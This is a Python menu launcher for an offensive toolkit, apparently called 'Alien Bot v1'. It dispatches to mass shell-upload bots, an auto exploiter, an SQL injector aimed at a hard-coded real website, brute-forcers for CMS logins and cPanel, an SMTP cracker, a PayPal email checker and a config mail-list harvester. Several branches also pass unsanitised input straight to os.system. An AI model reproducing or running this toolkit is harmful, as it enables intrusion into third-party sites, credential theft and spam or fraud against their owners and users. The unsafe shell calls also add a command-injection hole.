#~ Alien Bot v1
#~ Coded by imhunterand 1337
#~ 2022 New Priv8 Bot :)
#~ 2022 New Priv8 and Best Exploits :)
#~ We don't accept any responsibility for any illegal usage!

import requests,os
from colorama import Fore,init

init(autoreset=True)

g = Fore.GREEN
r = Fore.RED
b = Fore.RED
w = Fore.GREEN

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")
	
def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]
banner = """
{}
\033[1;31;45m
 █████  ██      ██ ███████ ███    ██ ██████   ██████  ████████ 
██   ██ ██      ██ ██      ████   ██ ██   ██ ██    ██    ██    
███████ ██      ██ █████   ██ ██  ██ ██████  ██    ██    ██    
██   ██ ██      ██ ██      ██  ██ ██ ██   ██ ██    ██    ██    
██   ██ ███████ ██ ███████ ██   ████ ██████   ██████     ██    
                                                               
                                                                                          
 {}[{}+{}] Github:  https://github.com/imhunterand
 [{}+{}] Available Exploits:   
 {}=============================={}
 [{}1{}] Alien Bot V1 Private Scanner [Pro]
 [{}2{}] Best Google Auto Dorker
 [{}3{}] Mass Url Collector Multi Thread
 [{}4{}] CMS Detector Site -filter website
 [{}5{}] Reverse ip Priv8 Unlimted
 [{}6{}] Multi shell checker ( live or no )
 [{}7{}] Auto Exploiter Shell Upload Bot
 [{}8{}] Automatic SQLI Injector 
 [{}9{}] Viper 1337 Private Bot
 [{}10{}] Mass Brute Force All CMS 
 [{}11{}] Zone-h Grabber
 [{}12{}] Smtp Cracker Combo & Mailist
 [{}13{}] Viper 1337 private Sender
 [{}14{}] Cpanel Cracker V.20
 [{}15{}] PayPal Valid Email Checker
 [{}16{}] Mass cPanel Reset Password Checker
 [{}17{}] Mass Mailst Collect From Config
 [{}18{}] Mass Shell Upload Bot
 [{}19{}] PhpUnit 0day new version v2
 [{}20{}] Check For Latest Update
"""

print(banner.format(g,b,g,w,r,b,g,r,g,r,g,r,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g,b,g))

tool = raw_input(g + "["+r+"*"+g+"] Choose tool : ")

if tool == "1":
	os.chdir("Tools/Tool1")
	sitelist = raw_input("\n[*] Sitelist  ==>  ")
	os.system("python v13.pyc " + sitelist)
	
elif tool == "2":
	os.chdir("Tools/Tool2")
	os.system("python priv8.py")
	
elif tool == "3":
	os.chdir("Tools/Tool3")
	os.system("python work.pyc")
		
elif tool == "4":
	os.chdir("Tools/Tool4")
	os.system("python cms.py")
	
elif tool == "5":
	os.chdir("Tools/Tool5")
	os.system("python reverseip.py")
		
elif tool == "6":
	os.chdir("Tools/Tool6")
	sitelist = raw_input("\n[*] Sitelist  ==>  ")
	os.system("python checker.py " + sitelist)
	
elif tool == "7":
	os.chdir("Tools/Tool7")
	scantype = raw_input("\n[1] Single Target\n[2] List Scan\n[3] Thread List Scan\n\n[*] Choose scan type : ")
	if scantype == "1":
		os.system("python icgAutoExploiter.py 1")
	elif scantype == "2":
		os.system("python icgAutoExploiter.py 2")
	elif scantype == "3":
		os.system("python icgAutoExploiter.py 3")
	else:
		pass
	
elif tool == "8":
	os.chdir("Tools/Tool8")
	os.system("python injector.py -t https://www.aayojanevents.in/service-details.php?id=1")
	
elif tool == "9":
	os.chdir("Tools/Tool9")
	os.system("python end.py")
	
elif tool == "10":
	os.chdir("Tools/Tool10")
	os.system("python brute.py")
	
elif tool == "11":
	os.chdir("Tools/Tool11")
	os.system("python zone.py")
	
elif tool == "12":
	os.chdir("Tools/Tool12")
	os.system("python priv8.py")
	
elif tool == "13":
	os.chdir("Tools/Tool13")
	os.system("run.bat")
	
elif tool == "14":
	os.chdir("Tools/Tool14")
	sitelist = raw_input("\n[*] Sitelist  ==>  ")
	os.system("python bruter.py 50 domain.txt password.txt  " + sitelist)
	
elif tool == "15":
	os.chdir("Tools/Tool15")
	os.system("python check.py")
	
elif tool == "16":
	os.chdir("Tools/Tool16")
	os.system("python cp.py list.txt")
	
elif tool == "17":
	os.chdir("Tools/Tool17")
	os.system("python maillist.py")
	
elif tool == "18":
	os.chdir("Tools/Tool18")
	os.system("python bot.py list.txt")
	
elif tool == "19":
	os.chdir("Tools/Tool19")
	os.system("python unit0day.py")
	
elif tool == "20":
	os.chdir("Tools/Tool20")
	os.system("viper.txt")	
else:
	pass
